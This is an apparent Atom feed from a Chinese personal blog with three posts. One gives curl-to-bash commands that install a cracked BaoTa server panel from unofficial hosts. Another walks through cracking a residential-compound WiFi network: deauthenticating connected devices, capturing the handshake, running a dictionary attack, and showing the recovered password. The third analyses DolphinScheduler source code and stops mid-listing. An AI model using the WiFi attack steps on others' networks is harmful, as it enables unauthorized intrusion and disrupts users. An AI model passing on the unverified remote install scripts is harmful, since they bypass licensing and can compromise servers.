<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>山城冰荔枝</title>
  
  
  <link href="https://sfyyh.github.io/atom.xml" rel="self"/>
  
  <link href="https://sfyyh.github.io/"/>
  <updated>2023-08-07T05:49:16.217Z</updated>
  <id>https://sfyyh.github.io/</id>
  
  <author>
    <name>山城冰荔枝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>宝塔面板企业版</title>
    <link href="https://sfyyh.github.io/2023/08/07/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E4%BC%81%E4%B8%9A%E7%89%88/"/>
    <id>https://sfyyh.github.io/2023/08/07/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E4%BC%81%E4%B8%9A%E7%89%88/</id>
    <published>2023-08-07T05:44:37.000Z</published>
    <updated>2023-08-07T05:49:16.217Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>从外部引入脚本</p><p>测试可用</p><p>自行辨别安全</p><p>安装脚本和升级脚本自己看实际情况使用</p><p>宝塔企业版介绍</p><p>· 安全：剥离了所有与宝塔官方的通信、上报、下发；并且不与本站企业版服务器通信；</p><p>· 免费：提升为企业会员，免费使用软件商店中的所有[企业版插件]、[专业版插件]、[运行环境]、[免费插件]、[宝塔插件]；部分[第三方应用]安装可能会失败；</p><p>· 解决方案：所有功能与原版一致，如有任何问题请参考宝塔官方解决方案；或前往交流群交流！</p><p>· 面板修复：企业版不与官方通信，也没有与我们服务器通信，所以无法判断贵站情况，建议使用升级代码修复&#x2F;或安装宝塔官方版再安装企业版(小概率出现异常，大概率只重装面板不影响网站运行)；</p><p>· 其他提示：如果发现[软件商店]空白，大多是服务器与你本地的网络问题，请清理本地缓存&#x2F;切换浏览器的访客模式访问&#x2F;切换本地代理IP；</p><p>· 本站声明：企业版基于官方代码、仅做通信剥离、代码未加密、未添加任何新增代码！</p><h2 id="宝塔企业版面板："><a href="#宝塔企业版面板：" class="headerlink" title="宝塔企业版面板："></a>宝塔企业版面板：</h2><p>新环境新服务器（也是就什么都没装的使用下面命令安装）已安装朋友请直接跳过往下看！</p><p>官方最新版7.9版本，安装脚本（来源宝塔官方）：</p><p>教程环境使用的是CentOS 7.9</p><h2 id="安装命令："><a href="#安装命令：" class="headerlink" title="安装命令："></a>安装命令：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Centos安装命令（默认安装是7.8.0 直接在线升级7.9.3）：</span><br><span class="line"></span><br><span class="line">主节点：yum install -y wget &amp;&amp; wget -O install.sh http://io.bt.sy/install/install_6.0.sh &amp;&amp; sh install.sh </span><br><span class="line"></span><br><span class="line">海外节点专用：yum install -y wget &amp;&amp; wget -O install.sh http://io.yu.al/install/install_6.0.sh &amp;&amp; sh install.sh </span><br><span class="line"></span><br><span class="line">试验性Centos/Ubuntu/Debian安装命令 独立运行环境（py3.7） 可能存在少量兼容性问题 不断优化中</span><br><span class="line"></span><br><span class="line">主节点：curl -sSO http://io.bt.sy/install/install_panel.sh &amp;&amp; bash install_panel.sh </span><br><span class="line"></span><br><span class="line">海外节点专用：curl -sSO http://io.yu.al/install/install_panel.sh &amp;&amp; bash install_panel.sh </span><br><span class="line"></span><br><span class="line">Ubuntu Deepin安装命令：</span><br><span class="line"></span><br><span class="line">主节点：wget -O install.sh http://io.bt.sy/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh </span><br><span class="line"></span><br><span class="line">海外节点专用：wget -O install.sh http://io.yu.al/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh </span><br><span class="line"></span><br><span class="line">Debian安装命令：</span><br><span class="line"></span><br><span class="line">主节点：wget -O install.sh http://io.bt.sy/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh </span><br><span class="line"></span><br><span class="line">海外节点专用：wget -O install.sh http://io.yu.al/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh </span><br><span class="line"></span><br><span class="line">Fedora安装命令:</span><br><span class="line"></span><br><span class="line">主节点：wget -O install.sh http://io.bt.sy/install/install_6.0.sh &amp;&amp; bash install.sh </span><br><span class="line"></span><br><span class="line">海外节点专用：wget -O install.sh http://io.yu.al/install/install_6.0.sh &amp;&amp; bash install.sh[/van-wechat-hide]</span><br></pre></td></tr></table></figure><h2 id="升级教程："><a href="#升级教程：" class="headerlink" title="升级教程："></a>升级教程：</h2><p>1.首先升级到官方最新版7.9版本，升级脚本（来源宝塔官方）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://download.bt.cn/install/update_panel.sh|bash</span><br></pre></td></tr></table></figure><p>升级命令1</p><p>Linux面板 7.9.3 升级企业版命令 1（7.9.3 官方版 &#x2F; 7.7.0 开心版 可以执行这个升级到 7.9.3 开心版）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">主节点：curl https://io.bt.sy/install/update_panel.sh|bash</span><br><span class="line"></span><br><span class="line">海外节点专用：curl https://io.yu.al/install/update_panel.sh|bash</span><br><span class="line"></span><br><span class="line">升级命令2</span><br><span class="line"></span><br><span class="line">Linux面板 7.9.3 升级企业版命令 2（7.9.3 官方版 / 7.7.0 开心版 可以执行这个升级到 7.9.3 开心版）：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">主节点：curl http://io.bt.sy/install/update6.sh|bash</span><br><span class="line"></span><br><span class="line">海外节点专用：curl http://io.yu.al/install/update6.sh|bash</span><br><span class="line"></span><br><span class="line">[/van-wechat-hide]</span><br><span class="line"></span><br><span class="line">以上升级命令都可以升级最新版！</span><br></pre></td></tr></table></figure><p>至此安装完成，我们进入宝塔面板，按住Ctrl+f5刷新，多刷新几次或等待一两分钟即可。</p><h2 id="7-9-0开心版更新记录："><a href="#7-9-0开心版更新记录：" class="headerlink" title="7.9.0开心版更新记录："></a>7.9.0开心版更新记录：</h2><p>系统工具：日志清理工具增加2.0版本！</p><p>宝塔插件：堡塔网站加速增加4.2版本！</p><p>专业版插件：网站监控报表增加6.8版本！</p><p>企业版插件：堡塔防提权改名堡塔防入侵！</p><p>企业版插件：堡塔限制访问型证书-Linux版增加1.2版本！</p><p>第三方插件：Nginx免费防火墙更新6.3版本！</p><p>第三方插件：百度网盘更新3.9版本！</p><p>部分第三方插件已经全部更新同步官方！</p><p>修复第三方插件百度网盘无法使用问题！</p><p>修复已知道的一些插件到期的问题！</p><p>修复第一次安装脚本，需要退出登录重登才能安装插件的逻辑问题！</p><p>修复部分用户登录虚拟账户无法获取列表authlist空白的问题！</p><p>修复危险级别：特高去除宝塔因为账户跟宝塔不匹配封ban用户ip风险的问题（导致恢复免费版也无法使用，只能降级7.7.0才能使用）！</p><p>已支持Arm构架！！！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="网站搭建" scheme="https://sfyyh.github.io/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="宝塔面板" scheme="https://sfyyh.github.io/tags/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF/"/>
    
  </entry>
  
  <entry>
    <title>记一次对小区wifi渗透</title>
    <link href="https://sfyyh.github.io/2023/08/03/my-first-blog/"/>
    <id>https://sfyyh.github.io/2023/08/03/my-first-blog/</id>
    <published>2023-08-03T13:43:26.000Z</published>
    <updated>2023-08-03T13:49:56.399Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="wifi渗透-一"><a href="#wifi渗透-一" class="headerlink" title="wifi渗透(一)"></a>wifi渗透(一)</h1><h3 id="第三步——检查并开启网卡的监听功能"><a href="#第三步——检查并开启网卡的监听功能" class="headerlink" title="第三步——检查并开启网卡的监听功能"></a>第三步——检查并开启网卡的监听功能</h3><p>airmon-ng：检查网卡是否支持监听功能的</p><p><img src="https://picture.gotarget.top//image-20220206191950754.png" alt="image-20220206191950754"></p><p>airmon-ng start wlan0mon ：激活无线网卡的监听模式</p><p><img src="https://picture.gotarget.top//image-20220206192030956.png" alt="image-20220206192030956"></p><h3 id="第四步——扫描周边wifi信号"><a href="#第四步——扫描周边wifi信号" class="headerlink" title="第四步——扫描周边wifi信号"></a>第四步——扫描周边wifi信号</h3><p>airodump-ng wlan0mon ：扫描当前周边环境的WiFi信号</p><p><img src="https://picture.gotarget.top//image-20220206192404063.png" alt="image-20220206192404063"></p><p><strong>注意：找到你要破解的wifi信息，记住它的BSSID和CH,后面要用！</strong></p><h3 id="第五步——抓包"><a href="#第五步——抓包" class="headerlink" title="第五步——抓包"></a>第五步——抓包</h3><p>下面里的部分信息根据自己的情况进行替换</p><p>抓包命令：airodump-ng -c &#x3D;&#x3D;CH号码&#x3D;&#x3D; –bssid &#x3D;&#x3D;BSSID号码&#x3D;&#x3D; -w &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake wlan0mon</p><p><strong>注意：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-w后接抓包后得到的文件保存路径和名称，注意路径！ 我的用户名是kali，你的填你自己的</span><br></pre></td></tr></table></figure><p><img src="https://picture.gotarget.top//image-20220206192728797.png" alt="image-20220206192728797"></p><p><strong>注：这种方式是一种被动等待的方式，所以我们需要将链接在该wifi上的设备踢下线，以便我们快速抓包。</strong></p><p><strong>这里我们需要记下BSSID(WIFI路由地址)和STATION（链接设备号），接下来我们将该设备从该wifi链接状态下强制踢下线</strong></p><h3 id="第六步——打掉连接"><a href="#第六步——打掉连接" class="headerlink" title="第六步——打掉连接"></a>第六步——打掉连接</h3><p>ACK 死亡攻击：aireplay-ng -0 10 -a BSSID号 -c STATION号 wlan0mon</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10——是攻击次数，一般10次就足够我们抓到包了，如果将次数调整的很大，那么就会持续的进行攻击，导致该设备长期无法链接到该wifi!</span><br></pre></td></tr></table></figure><p><strong>注：这样做将会导致连接在该wifi上的设备被强制下线，然后因为wifi的自动重连机制，使得我们可以快速抓到包</strong>。</p><p><img src="https://picture.gotarget.top//image-20220206193900205.png" alt="image-20220206193900205"></p><h3 id="最后一步——破解"><a href="#最后一步——破解" class="headerlink" title="最后一步——破解"></a>最后一步——破解</h3><h4 id="破解语法："><a href="#破解语法：" class="headerlink" title="破解语法："></a>破解语法：</h4><p>aircrack-ng -w &lt;指定字典&gt; -b &lt;目的路由MAC地址&gt; &lt;抓到的握手包&gt;</p><p><strong>注</strong>：目的路由MAC地址——就是BSSID 抓到的握手包——cap文件</p><h4 id="kali自带字典："><a href="#kali自带字典：" class="headerlink" title="kali自带字典："></a>kali自带字典：</h4><p>aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake-0*.cap</p><p><strong>需要先解压</strong>：gzip -d &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz</p><h4 id="自我指定字典："><a href="#自我指定字典：" class="headerlink" title="自我指定字典："></a>自我指定字典：</h4><p>aircrack-ng -w &#x2F;home&#x2F;kali&#x2F;password.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake-0*.cap</p><h3 id="成功！"><a href="#成功！" class="headerlink" title="成功！"></a>成功！</h3><p><img src="https://picture.gotarget.top//image-20220206164700961.png" alt="image-20220206164700961"></p><p>破解的wifi密码就为a123456789</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sfyyh.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网安" scheme="https://sfyyh.github.io/tags/%E7%BD%91%E5%AE%89/"/>
    
  </entry>
  
  <entry>
    <title>一次对dolphinscheduler的源码分析</title>
    <link href="https://sfyyh.github.io/2023/07/20/%E4%B8%80%E6%AC%A1%E5%AF%B9dolphinscheduler%E7%9A%84%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://sfyyh.github.io/2023/07/20/%E4%B8%80%E6%AC%A1%E5%AF%B9dolphinscheduler%E7%9A%84%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2023-07-20T01:05:10.000Z</published>
    <updated>2023-08-04T01:42:34.318Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="dolphinscheduler学习"><a href="#dolphinscheduler学习" class="headerlink" title="dolphinscheduler学习"></a>dolphinscheduler学习</h1><h2 id="DolphinScheduler-项目结构"><a href="#DolphinScheduler-项目结构" class="headerlink" title="DolphinScheduler 项目结构"></a><strong>DolphinScheduler 项目结构</strong></h2><p><strong>2.1 结构分析</strong></p><p><img src="/images/Untitled.png" alt="Untitled"></p><p>导入项目后，可以看到<strong>其主要核心模块如下：</strong></p><table><thead><tr><th>模块</th><th>描述</th></tr></thead><tbody><tr><td>dolphinscheduler-alert</td><td>告警模块，提供 AlertServer 服务。</td></tr><tr><td>dolphinscheduler-api</td><td>web应用模块，提供 ApiServer 服务。</td></tr><tr><td>dolphinscheduler-common</td><td>通用的常量枚举、工具类、数据结构或者基类</td></tr><tr><td>dolphinscheduler-dao</td><td>提供数据库访问等操作。</td></tr><tr><td>dolphinscheduler-remote</td><td>基于 netty 的客户端、服务端</td></tr><tr><td>dolphinscheduler-server</td><td>MasterServer 和 WorkerServer 服务</td></tr><tr><td>dolphinscheduler-service</td><td>service模块，包含Quartz、Zookeeper、日志客户端访问服务，便于server模块和api模块调用</td></tr><tr><td>dolphinscheduler-ui</td><td>前端模块</td></tr></tbody></table><p><strong>2.2 表分析</strong></p><p>dolphinscheduler_ddl.sql及dolphinscheduler_dml.sql</p><p><img src="/images/Untitled%201.png" alt="Untitled"></p><p><strong>执行完后，可以在数据库里看到有如下表：</strong></p><table><thead><tr><th>表名</th><th>表信息</th></tr></thead><tbody><tr><td>t_ds_access_token</td><td>访问ds后端的token</td></tr><tr><td>t_ds_alert</td><td>告警信息</td></tr><tr><td>t_ds_alertgroup</td><td>告警组</td></tr><tr><td>t_ds_command</td><td>执行命令</td></tr><tr><td>t_ds_datasource</td><td>数据源</td></tr><tr><td>t_ds_error_command（核心表）</td><td>错误命令</td></tr><tr><td>t_ds_process_definition（核心表）</td><td>流程定义</td></tr><tr><td>t_ds_process_instance（核心表）</td><td>流程实例</td></tr><tr><td>t_ds_project</td><td>项目</td></tr><tr><td>t_ds_queue</td><td>队列</td></tr><tr><td>t_ds_relation_datasource_user</td><td>用户关联数据源</td></tr><tr><td>t_ds_relation_process_instance</td><td>子流程</td></tr><tr><td>t_ds_relation_project_user</td><td>用户关联项目</td></tr><tr><td>t_ds_relation_resources_user</td><td>用户关联资源</td></tr><tr><td>t_ds_relation_udfs_user</td><td>用户关联UDF函数</td></tr><tr><td>t_ds_relation_user_alertgroup</td><td>用户关联告警组</td></tr><tr><td>t_ds_resources</td><td>资源文件</td></tr><tr><td>t_ds_schedules（核心表）</td><td>流程定时调度</td></tr><tr><td>t_ds_session</td><td>用户登录的session</td></tr><tr><td>t_ds_task_instance（核心表）</td><td>任务实例</td></tr><tr><td>t_ds_tenant</td><td>租户</td></tr><tr><td>t_ds_udfs</td><td>UDF资源</td></tr><tr><td>t_ds_user</td><td>用户</td></tr><tr><td>t_ds_version</td><td>ds版本信息</td></tr></tbody></table><p><strong>2.2.1 类关系图 （用户&#x2F;队列&#x2F;数据源）</strong></p><p><strong>DS</strong></p><p><img src="/images/image%201.png" alt="1"></p><p><strong>描述如下：</strong></p><ul><li>一个租户下可以有多个用户；</li><li><code>t_ds_user</code>中的<code>queue</code>字段存储的是队列表中的<code>queue_name</code>信息;</li><li><code>t_ds_tenant</code>下存的是<code>queue_id</code>，在流程定义执行过程中，用户队列优先级最高，用户队列为空则采用租户队列；</li><li><code>t_ds_datasource</code>表中的<code>user_id</code>字段表示创建该数据源的用户;</li><li><code>t_ds_relation_datasource_user</code>中的<code>user_id</code>表示，对数据源有权限的用户。</li></ul><p><strong>2.2.2 类关系图 （项目&#x2F;资源&#x2F;告警）</strong></p><p><strong>DS</strong></p><p><img src="/images/image%201.png" alt="2"></p><p><strong>描述如下：</strong></p><ul><li><strong>一个用户可以有多个项目，用户项目授权通过t_ds_relation_project_user表完成project_id和user_id的关系绑定</strong>；</li><li>t_ds_projcet表中的user_id表示创建该项目的用户；</li><li>t_ds_relation_project_user表中的user_id表示对项目有权限的用户；</li><li>t_ds_resources表中的user_id表示创建该资源的用户；</li><li>t_ds_relation_resources_user中的user_id表示对资源有权限的用户；</li><li>t_ds_udfs表中的user_id表示创建该UDF的用户；</li><li>t_ds_relation_udfs_user表中的user_id表示对UDF有权限的用户。</li></ul><p><strong>2.2.3 类关系图 （ 命令&#x2F;流程&#x2F;任务）</strong></p><p><strong>DS</strong><br><img src="/images/image3.png" alt="3"></p><p><img src="/images/image4.png" alt="4"></p><p><strong>描述如下：</strong></p><ul><li><strong>一个项目有多个流程定义，一个流程定义可以生成多个流程实例，一个流程实例可以生成多个任务实例</strong>；</li><li>t_ds_schedulers表存放流程定义的定时调度信息；</li><li>t_ds_relation_process_instance表存放的数据用于处理流程定义中含有子流程的情况，parent_process_instance_id表示含有子流程的主流程实例id，process_instance_id表示子流程实例的id，parent_task_instance_id表示子流程节点的任务实例id，流程实例表和任务实例表分别对应t_ds_process_instance表和t_ds_task_instance表</li></ul><p><strong>03</strong></p><p><strong>DolphinScheduler 源码分析</strong></p><p>讲解源码前，先贴一份官网的启动流程图：</p><p><img src="/images/image5.png" alt="5"></p><p><strong>3.1 ExecutorController</strong></p><p><strong>DS</strong></p><p>org.apache.dolphinscheduler.api.controller.ExecutorController</p><p><img src="/images/image6.png" alt="6 text"></p><p>以下是对各接口的描述：</p><table><thead><tr><th>接口</th><th>描述</th></tr></thead><tbody><tr><td>&#x2F;start-process-instance</td><td>执行流程实例</td></tr><tr><td>&#x2F;batch-start-process-instance</td><td>批量执行流程实例</td></tr><tr><td>&#x2F;execute</td><td>操作流程实例，如：暂停, 停止, 重跑, 从暂停恢复,从停止恢复</td></tr><tr><td>&#x2F;batch-execute</td><td>批量操作流程实例</td></tr><tr><td>&#x2F;start-check</td><td>检查流程定义或检查所有的子流程定义是否在线</td></tr></tbody></table><p>接下我们看看最核心的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * do action to process instance: pause, stop, repeat, recover from pause, recover from stop</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loginUser login user</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectCode project code</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> processInstanceId process instance id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> executeType execute type</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> execute result code</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;execute&quot;, notes = &quot;EXECUTE_ACTION_TO_PROCESS_INSTANCE_NOTES&quot;)</span></span><br><span class="line">    <span class="meta">@ApiImplicitParams(&#123;</span></span><br><span class="line"><span class="meta">            @ApiImplicitParam(name = &quot;processInstanceId&quot;, value = &quot;PROCESS_INSTANCE_ID&quot;, required = true, dataType = &quot;Int&quot;, example = &quot;100&quot;),</span></span><br><span class="line"><span class="meta">            @ApiImplicitParam(name = &quot;executeType&quot;, value = &quot;EXECUTE_TYPE&quot;, required = true, dataType = &quot;ExecuteType&quot;)</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/execute&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.OK)</span></span><br><span class="line">    <span class="meta">@ApiException(EXECUTE_PROCESS_INSTANCE_ERROR)</span></span><br><span class="line">    <span class="meta">@AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">execute</span><span class="params">(<span class="meta">@ApiIgnore</span> <span class="meta">@RequestAttribute(value = Constants.SESSION_USER)</span> User loginUser,</span></span><br><span class="line"><span class="params">                          <span class="meta">@ApiParam(name = &quot;projectCode&quot;, value = &quot;PROJECT_CODE&quot;, required = true)</span> <span class="meta">@PathVariable</span> <span class="type">long</span> projectCode,</span></span><br><span class="line"><span class="params">                          <span class="meta">@RequestParam(&quot;processInstanceId&quot;)</span> Integer processInstanceId,</span></span><br><span class="line"><span class="params">                          <span class="meta">@RequestParam(&quot;executeType&quot;)</span> ExecuteType executeType</span></span><br><span class="line"><span class="params">    )</span> &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">result</span> <span class="operator">=</span> execService.execute(loginUser, projectCode, processInstanceId, executeType);</span><br><span class="line">        <span class="keyword">return</span> returnDataList(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到execute接口，是直接使用ExecService去执行了，下面分析下。</p><p><strong>3.2 ExecService</strong></p><p><strong>DS</strong></p><p><strong>下面看看里面的execute方法，已经加好了注释：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 操作工作流实例</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> loginUser         登录用户</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> projectCode       项目编码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> processInstanceId 流程实例ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> executeType       执行类型（repeat running、resume pause、resume failure、stop、pause）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 执行结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">execute</span><span class="params">(User loginUser, <span class="type">long</span> projectCode, Integer processInstanceId, ExecuteType executeType)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 查询项目信息 **/</span></span><br><span class="line">    <span class="type">Project</span> <span class="variable">project</span> <span class="operator">=</span> projectMapper.queryByCode(projectCode);</span><br><span class="line"><span class="comment">//check user access for project</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 判断当前用户是否有操作权限 **/</span></span><br><span class="line">    Map&lt;String, Object&gt; result = projectService.checkProjectAndAuth(loginUser, project, projectCode, ApiFuncIdentificationConstant.map.get(executeType));</span><br><span class="line">    <span class="keyword">if</span> (result.get(Constants.STATUS) != Status.SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 检查Master节点是否存在 **/</span></span><br><span class="line">    <span class="keyword">if</span> (!checkMasterExists(result)) &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 查询工作流实例详情 **/</span></span><br><span class="line">    <span class="type">ProcessInstance</span> <span class="variable">processInstance</span> <span class="operator">=</span> processService.findProcessInstanceDetailById(processInstanceId);</span><br><span class="line">    <span class="keyword">if</span> (processInstance == <span class="literal">null</span>) &#123;</span><br><span class="line">        putMsg(result, Status.PROCESS_INSTANCE_NOT_EXIST, processInstanceId);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 根据工作流实例绑定的流程定义ID查询流程定义 **/</span></span><br><span class="line">    <span class="type">ProcessDefinition</span> <span class="variable">processDefinition</span> <span class="operator">=</span> processService.findProcessDefinition(processInstance.getProcessDefinitionCode(),</span><br><span class="line">            processInstance.getProcessDefinitionVersion());</span><br><span class="line">    <span class="keyword">if</span> (executeType != ExecuteType.STOP &amp;&amp; executeType != ExecuteType.PAUSE) &#123;</span><br><span class="line"><span class="comment">/*** 校验工作流定义能否执行（工作流是否存在？是否上线状态？存在子工作流定义不是上线状态？） **/</span></span><br><span class="line">        result = checkProcessDefinitionValid(projectCode, processDefinition, processInstance.getProcessDefinitionCode(), processInstance.getProcessDefinitionVersion());</span><br><span class="line">        <span class="keyword">if</span> (result.get(Constants.STATUS) != Status.SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 